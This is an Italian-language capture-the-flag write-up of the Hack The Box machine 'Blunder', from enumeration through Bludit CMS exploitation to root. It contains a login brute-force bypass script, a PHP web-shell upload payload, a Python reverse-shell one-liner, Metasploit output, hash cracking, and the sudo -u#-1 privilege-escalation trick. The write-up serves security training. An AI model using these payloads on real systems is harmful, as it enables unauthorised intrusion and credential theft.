**Target: 10.10.10.191**

# INFORMATION GATHERING 

Iniziamo con un veloce scan [Nmap](../Note/Tool/Nmap.md)

```bash
┌──(root㉿kali)-[/home/kali/htb/blunder]
└─# nmap -sT -sC -sV 10.10.10.191
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 02:25 EDT
Nmap scan report for 10.10.10.191
Host is up (0.050s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Blunder | A blunder of interesting facts
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Blunder

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds
```

abbiamo una porta aperta solo la 80. 
Uno scan completo su tutte le porte non ci da nessuna nuova informazione
la porta 21 me la segnala come chiusa ma non so perche me la mostra 

# ENUMERATION

Visitiamo il sito 

![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/blunder.png)
Ci troviamo difronte a quello che sembra essere un blog. Scorrendo fino in fondo vediamo la scritta Powered byEgotisticalSW 

Cercando su google non troviamo nella di utile.

Procediamo a enumerare utilizzando [Ffuz](../Note/Tool/Ffuz.md) per vedere cosa troviamo 
```bash
┌──(root㉿kali)-[/home/kali/htb/blunder]
└─# ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.191/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.191/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________
[Status: 200, Size: 3281, Words: 225, Lines: 106, Duration: 114ms]
    * FUZZ: about

[Status: 200, Size: 7562, Words: 794, Lines: 171, Duration: 115ms]
    * FUZZ: 0

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 84ms]
    * FUZZ: admin

[Status: 200, Size: 30, Words: 5, Lines: 1, Duration: 78ms]
    * FUZZ: install.php

[Status: 200, Size: 22, Words: 3, Lines: 2, Duration: 144ms]
    * FUZZ: robots.txt

[Status: 200, Size: 118, Words: 20, Lines: 5, Duration: 74ms]
    * FUZZ: todo.txt


[WARN] Caught keyboard interrupt (Ctrl-C)

```

la pagine admin sembra interessante la visitiamo e ci troviamo siamo davanti ad un prompt di login
![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Blunder1.png)
Ho provato alcune credenziali di default ma niente, anche delle SQL-INJECTION non hanno alcun effetto.

La pagina /install.php ci dice che bludit è stato installato 
```
Bludit is already installed ;)
```

mentre /todo.txt riposta quanto segue:

```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

ecco il motivo per cui la porta 21 era chiusa 
abbiamo quello che sembra essere un nome utente `fergus`

Una ricerca con [Searchsploit](../Note/Tool/Searchsploit.md) ci fornisce diverse opzioni.

```bash
┌──(root㉿kali)-[/home/kali]
└─# searchsploit bludit
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass | php/webapps/48746.rb
Bludit - Directory Traversal Image File Upload (Metasploit)| php/remote/47699.rb
Bludit 3-14-1 Plugin 'UploadPlugin' - Remote Code Execution (RCE) (Authenticated)| php/webapps/51160.txt
Bludit 3.13.1 - 'username' Cross Site Scripting (XSS) | php/webapps/50529.txt
Bludit 3.9.12 - Directory Traversal | php/webapps/48568.py
Bludit 3.9.2 - Auth Bruteforce Bypass | php/webapps/48942.py
Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit) | php/webapps/49037.rb
Bludit 3.9.2 - Directory Traversal| multiple/webapps/48701.txt
Bludit 4.0.0-rc-2 - Account takeover | php/webapps/51360.txt
Bludit < 3.13.1 Backup Plugin - Arbitrary File Download (Authenticated)| php/webapps/51541.py
Bludit CMS v3.14.1 - Stored Cross-Site Scripting (XSS) (Authenticated)| php/webapps/51476.txt
bludit Pages Editor 3.0.0 - Arbitrary File Upload | php/webapps/46060.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Dobbiamo scoprire la versione di Bludit eseguita per vedere se riusciamo a sfruttare qualche vulnerabiltà.

Analizzando il codice sorgente di /admin troviamo la versione 
```java
<!-- Javascript -->
	<script src="http://10.10.10.191/bl-kernel/js/jquery.min.js?version=3.9.2"></script>
<script src="http://10.10.10.191/bl-kernel/js/bootstrap.bundle.min.js?version=3.9.2"></script>
```

Dopo diversi tentativi nessuna delle soluzioni fornite da searchsploit sembra funzionare.
ma cercando in rete troviamo questo [articolo](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) dove si parla di Bludit Brute Force Mitigation Bypass

```python
#!/usr/bin/env python3
import re
import requests

host = 'http://192.168.194.146/bludit'
login_url = host + '/admin/login'
username = 'admin'
wordlist = []

# Generate 50 incorrect passwords
for i in range(50):
    wordlist.append('Password{i}'.format(i = i))

# Add the correct password to the end of the list
wordlist.append('adminadmin')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```

Vediamo che la PoC è fatta in modo da dimostrare il concetto, non impostato per l'exploit.
bisogna modificarlo.

```python
#!/usr/bin/env python3
import re
import requests
import sys

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'

with open(sys.argv[1], 'r') as f:
    wordlist = [x.strip() for x in f.readlines()]

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print(f'\r[*] Trying: {password:<90}'.format(p = password), end="", flush=True)

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print('\rSUCCESS: Password found!' + 50*" ")
            print(f'Use {username}:{password} to login.')
            print()
            break

```

ok abbiamo un username, ma ci manca un lista di password, andiamo a creala utilizando [Cewl](../Cewl.md)
che non fa altro che creare una serie di parole utilizzando il contenuto del sito, infatti non è raro che le passowrd utilizzate siano delle parole prese proprio dal sito su cui sono utilizzate.

```bash
┌──(root㉿kali)-[/home/kali/htb/blunder]
└─# cewl http://10.10.10.191 > wordlist.txt

┌──(root㉿kali)-[/home/kali/htb/blunder]
└─# ls
48942.py  wordlist.txt
```

siamo pronti per eseguilo 

```bash
┌──(root㉿kali)-[/home/kali/htb/blunder]
└─# ./bludi_brute.py wordlist.txt
SUCCESS: Password found!
Use fergus:RolandDeschain to login.
```

Utilizziamo le credenziali trovate per accedere al sito 

![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/blunder2.png)


# GAINING AN INITIAL FOOTHOLD

## Manual Foothold

Durante la ricerca su questa versione di Bludit, viene identificato un [problema](https://github.com/bludit/bludit/issues/1081) su GitHub. Ciò descrive in dettaglio un vettore di esecuzione del codice in questa versione del CMS, a causa del caricamento arbitrario di file e delle vulnerabilità di attraversamento delle directory. Siamo in grado di modificare il valore uuid, che viene utilizzato per specificare la posizione in cui verrà caricato il file.
Si suppone che il CMS blocchi il caricamento di file PHP. Tuttavia, è possibile caricare un file .png contenente codice PHP, nonché un file .htaccess che istruisce il server a gestire le immagini come codice PHP. È quindi possibile accedere all'immagine dannosa, fornendo l'utilizzo con l'esecuzione del comando sul server sottostante.
Un interessante commento finale sulla pagina del problema di GitHub suggerisce che non è richiesto un file .htaccess, poiché è anche possibile caricare normali file PHP, anche se viene restituito un errore nel corpo della risposta. Per prima cosa controlliamo il codice della versione 3.9.2 , che può essere scaricato da [qui](https://github.com/bludit/bludit/releases/tag/3.9.2). 
Il file pertinente è /bl-kernel/ajax/upload-images.php .

Non ci resta che , aprire Burp Suite e configurare  il browser in modo che punti al proxy, utilizzando uno strumento come Foxy Proxy. Nel browser, andiamo a http://10.10.10.191/admin/new-content, facciamo clic su Immagini e carichiamo un'immagine normale.  e catturiamo la richiesta

```bash
POST /admin/ajax/upload-images HTTP/1.1
Host: 10.10.10.191
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.191/admin/new-content
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=--------------------------
-24519939964357608924145519178
Content-Length: 512
Origin: http://10.10.10.191
DNT: 1
Connection: close
Cookie: BLUDIT-KEY=atkvm1cgaqekr03c0j35krl9t5

# codice immagine 

-----------------------------24519939964357608924145519178
Content-Disposition: form-data; name="images[]"; filename="normal.png"
Content-Type: image/png

<IMAGE>

-----------------------------24519939964357608924145519178
Content-Disposition: form-data; name="uuid"

e9db0bd2a08b1e59c6517e5014ad8fcf
-----------------------------24519939964357608924145519178
Content-Disposition: form-data; name="tokenCSRF"

bf4d7bdd3837f910be1753a72ecfb697f0b6241e
-----------------------------24519939964357608924145519178-

```

Inviamo la richiesta al bit Repeater di Burp premendo CTRL + R , modifica il valore uuid in ../../tmp e sostituiamo il codice immagine con il seguente payload PHP, che può essere utilizzato per eseguire comandi di sistema.

```php
<?=`$_GET[0]`?>
```

ottenendo la seguente richiesta

```burp
POST /admin/ajax/upload-images HTTP/1.1
Host: 10.10.10.191
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.191/admin/new-content
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=--------------------------
-24519939964357608924145519178
Content-Length: 512
Origin: http://10.10.10.191
DNT: 1
Connection: close
Cookie: BLUDIT-KEY=atkvm1cgaqekr03c0j35krl9t5

-----------------------------24519939964357608924145519178
Content-Disposition: form-data; name="images[]"; filename="exploit.png"
Content-Type: image/png

<?=`$_GET[0]`?>

-----------------------------24519939964357608924145519178
Content-Disposition: form-data; name="uuid"

../../tmp
-----------------------------24519939964357608924145519178
Content-Disposition: form-data; name="tokenCSRF"

bf4d7bdd3837f910be1753a72ecfb697f0b6241e
-----------------------------24519939964357608924145519178--

```
![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/blunder3.png)
non ci resta che visitare http://10.10.10.191/bl-content/tmp/wolf.png?0=whoami per vedere che siamo utenti www-data, dandoci conferma che la RCE funziona.

Ok abbiamo la nostra RCE funzionante è il momento di avere la nostra shell.
Vediamo se è installato python:
`http://10.10.10.191/bl-content/tmp/wolf.png?0=which+python`
il server ci restituisce `/user/bin/python`  perfetto

![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/blunder4.png)

Utilizziamo questa shell python 
```python 
python -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec
t(("10.10.14.23",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

che codificata in URL ci da
```URL
python%20-
c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_
STREAM);s.connect((%2210.10.14.24%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.f
ileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-
i%22]);%27
```

ci mettiamo in ascolto con nc
```bash
┌──(root㉿kali)-[/home/kali/tool/shell/webshell]
└─# nc -lvnp 443
listening on [any] 443 ...
```

la richiesta finale sarà
```html
http://10.10.10.191/bl-content/tmp/evil.php?0=python%20-
c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_
STREAM);s.connect((%2210.10.14.24%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.f
ileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-
i%22]);%27
```

e abbiamo la nostra shell
```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.191] 53632
/bin/sh: 0: can't access tty; job control turned off
$
```

eseguiamo il solito update della shell siamo pronti per la privesc.

## Automatic Foothold 

### Poc.py

Cercando il rete per `Bludit 3.9.2 RCE CVE ID` ci imbattiamo in [questa](https://github.com/0xConstant/CVE-2019-16113) repository di git 
dove si fa riferimento a due [CVE-2019-17240](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) (Bludit Brute Force Mitigation Bypass, menzionato in precedenza )& [CVE-2019-16113](https://www.exploit-db.com/exploits/47699). (modulo presente in metasploit)

Praticamente lo script non fa altro che concatenare le due vulnerabilità.
Una volta scaricato lo eseguiamo seguendo le istruzioni come segue

Per prima cosa ci mettiamo in ascolto con nc
```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 1234
listening on [any] 1234 ..
```

ed eseguiamo 

```bash
┌──(root㉿kali)-[/home/kali/htb/blunder]
└─# python3 poc.py

     _____      _    ______  _____  _____
    |  __ \    | |   | ___ \/  __ \|  ___|
    | |  \/ ___| |_  | |_/ /| /  \/| |__
    | | __ / _ \ __| |    / | |    |  __|
    | |_\ \  __/ |_ _| |\ \ | \__/\| |___
     \____/\___|\__(_)_| \_| \____/\____/

    This exploit combines CVE-2019-17240 & CVE-2019-16113 to gain remote shell on target.

    Created by: kisho64 (@h_a_m_i__)

Enter target URL (i.e. https://target.com): http://10.10.10.191
[ ~ ] Enter listener's IP: 10.10.14.24
[ ~ ] Enter listener's port: 1234
[...] Checking if the target is live...
[ + ] The target is live! We are good to go...

[ ~ ] Should I bruteforce username? [Y/N]: N
[ ~ ] What username should I use? (leave this to use admin as username): fergus
[ ~ ] Enter the location for password list: /home/kali/htb/blunder/wordlist.txt
[ * ] Tried: CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
[ * ] Tried: the
[ * ] Tried: Load
[ * ] Tried: Plugins
[ * ] Tried: and
[ * ] Tried: for
[ * ] Tried: Include
[ * ] Tried: Site
...<snip>...
[ * ] Tried: character
[ * ] Tried: RolandDeschain
[ + ] Creds found: fergus:RolandDeschain

[...] Attempting to login now...
[ + ] Login succeed... We are good to go :)

[ + ] The payload sbRyVnWevZ.php has been uploaded...
[ + ] The payload .htaccess has been uploaded...

[...] Attempting to get a shell... @ http://10.10.10.191/bl-content/tmp/sbRyVnWevZ.php
[ + ] You should be getting a shell by now, if not open http://10.10.10.191/bl-content/tmp/sbRyVnWevZ.php
```

otteniamo cosi la nostra shell.
```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.191] 55730
bash: cannot set terminal process group (1285): Inappropriate ioctl for device
bash: no job control in this shell
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$
```

### Metasploit

Come visto in precedenza abbiamo  [questo](https://www.exploit-db.com/exploits/47699)modulo di metasploit che fa al caso nostro ma per utilizzarlo dobbiamo avere prima la password per l'utente fergus.

Quindi apriamo metasploit e lo settiamo come segue:

```shell-session
msf6 exploit(linux/http/bludit_upload_images_exec) > show options

Module options (exploit/linux/http/bludit_upload_images_exec):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   BLUDITPASS  RolandDeschain   yes       The password for Bludit
   BLUDITUSER  fergus           yes       The username for Bludit
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      10.10.10.191     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The base path for Bludit
   VHOST                        no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.24      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Bludit v3.9.2



View the full module info with the info, or info -d command.
```

ed eseguiamo 
```shell-session

msf6 exploit(linux/http/bludit_upload_images_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.24:4444
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading refxkvlxsq.png...
[*] Uploading .htaccess...
[*] Executing refxkvlxsq.png...
[*] Sending stage (39927 bytes) to 10.10.10.191
[+] Deleted .htaccess
[*] Meterpreter session 1 opened (10.10.14.24:4444 -> 10.10.10.191:34578) at 2023-10-26 10:16:19 -0400

meterpreter > getuid
Server username: www-data
```

siamo pronti per la privesc.
# PRIVESC

# www-data --> hugo

Nella cartella `/home` abbiamo due utenti `hugo` e `shaun`
```bash
www-data@blunder:/home$ ls -la
total 16
drwxr-xr-x  4 root  root  4096 Apr 27  2020 .
drwxr-xr-x 21 root  root  4096 Jul  6  2021 ..
drwxr-xr-x 16 hugo  hugo  4096 May 26  2020 hugo
drwxr-xr-x 16 shaun shaun 4096 Jul  6  2021 shaun
www-data@blunder:cd /hugo
www-data@blunder:/home/hugo$ls
Desktop    Downloads  Pictures  Templates  user.txt
Documents  Music      Public    Videos
www-data@blunder:/home/hugo$ cat user.txt
cat: user.txt: Permission denied
```

Non abbiamo i permessi per leggere la user_flag.
Dobbiamo elevare i nostri privilegi.

Nella directory /var/www troviamo  le configurazioni web. Interessante, c'erano due versioni di Bludit lì:
Esplorando nella configurazioni  al percorso `/var/www/bludit-3.10.0a/bl-content/databases` troviamo un file `users.php` con delle credenziali.

```bash
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
```

Sembrano essere cifrate utilizziamo [hash-identifier] per vedere di quale hash si tratta

```bash
┌──(root㉿kali)-[/home/kali/htb/blunder]
└─# hash-identifier faca404fd5c0a31cf1897b823c695c85cffeb98d
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))

Least Possible Hashs:
[+] Tiger-160
[+] Haval-160
[+] RipeMD-160
[+] SHA-1(HMAC)
[+] Tiger-160(HMAC)
[+] RipeMD-160(HMAC)
[+] Haval-160(HMAC)
[+] SHA-1(MaNGOS)
[+] SHA-1(MaNGOS2)
[+] sha1($pass.$salt)
[+] sha1($salt.$pass)
[+] sha1($salt.md5($pass))
[+] sha1($salt.md5($pass).$salt)
[+] sha1($salt.sha1($pass))
[+] sha1($salt.sha1($salt.sha1($pass)))
[+] sha1($username.$pass)
[+] sha1($username.$pass.$salt)
[+] sha1(md5($pass))
[+] sha1(md5($pass).$salt)
[+] sha1(md5(sha1($pass)))
[+] sha1(sha1($pass))
[+] sha1(sha1($pass).$salt)
[+] sha1(sha1($pass).substr($pass,0,3))
[+] sha1(sha1($salt.$pass))
[+] sha1(sha1(sha1($pass)))
[+] sha1(strtolower($username).$pass)
-----------------
```

Possiamo darlo in pasto ad [Hashcat](../Note/Tool/Hashcat.md) che con il parametro -r `/usr/share/hashcat/rules/best64.rule ` trovera la password

```bash
┌──(root㉿kali)-[/home/kali/htb/blunder]
└─# hashcat -m100 -a0 pass_hahs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-Intel(R) Core(TM) i7-4750HQ CPU @ 2.00GHz, 1766/3597 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 77

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 1104517645

faca404fd5c0a31cf1897b823c695c85cffeb98d:Password120

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 100 (SHA1)
Hash.Target......: faca404fd5c0a31cf1897b823c695c85cffeb98d
Time.Started.....: Thu Oct 26 06:29:58 2023 (1 sec)
Time.Estimated...: Thu Oct 26 06:29:59 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  6925.1 kH/s (7.33ms) @ Accel:256 Loops:77 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7254016/1104517645 (0.66%)
Rejected.........: 0/7254016 (0.00%)
Restore.Point....: 93184/14344385 (0.65%)
Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
Candidate.Engine.: Device Generator
Candidates.#1....: doidinha -> 484848
Hardware.Mon.#1..: Util: 82%

Started: Thu Oct 26 06:29:54 2023
Stopped: Thu Oct 26 06:30:01 2023
```

anche [Crackstation](https://crackstation.net) è stato in grado di forzare l'hash

![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/blunder5.png)

loggiamoci come utente hugo con il comando `su hugo`

```bash
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo
Password:
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$

```

e ci prendiamo la nostra user_flag

```bash
hugo@blunder:~$ cat user.txt
65461e5180b46fb624a74544e907548d
```

## hugo --> root

Visto che abbiamo la password di hugo eseguiamo un `sudo -l` per vedere se possiamo eseguire qualcosa come utente root

```bash
hugo@blunder:~$ sudo -l
Password:
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

Ciò significa che posso eseguire sudo /bin/bash come qualsiasi utente tranne root, il che è un peccato, poiché root è l'utente con cui voglio eseguirlo.

###### CVE-2019-14287

La configurazione sopra dovrebbe impedire a sudo di funzionare come utente root. Nel novembre 2019 è stato rilasciato un CVE pubblico su come esistessero altri modi per accedere a root oltre a root per aggirare questa restrizione. Ciò influisce sulle versioni sudo precedenti alla 1.8.28. Vedo che Blunder è in esecuzione 1.8.25:

```bash
hugo@blunder:~$ sudo --version
Sudo version 1.8.25p1
Sudoers policy plugin version 1.8.25p1
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.25p1
```

Quando esegui sudo, puoi inserire -u [utente] per indicare con quale utente eseguire. Puoi anche inserire l'utente come numero nel formato -u#[uid]. root viene utilizzato con ID 0, quindi posso provare:

```bash
hugo@blunder:~$ sudo -u#0 /bin/bash 
Password: 
Sorry, user hugo is not allowed to execute '/bin/bash' as root on blunder.
```

Finora le cose stanno funzionando come previsto. La vulnerabilità è che posso inserire l'ID utente -1 e sudo lo tratterà come root. Funziona:

```bash
hugo@blunder:~$ sudo -u#-1 /bin/bash
Password:
root@blunder:/home/hugo#

```

ed ecco la nostra root_flag

```bash
root@blunder:/home/hugo# cat /root/root.txt
f659347e0de211cf75befb0346da0aac
```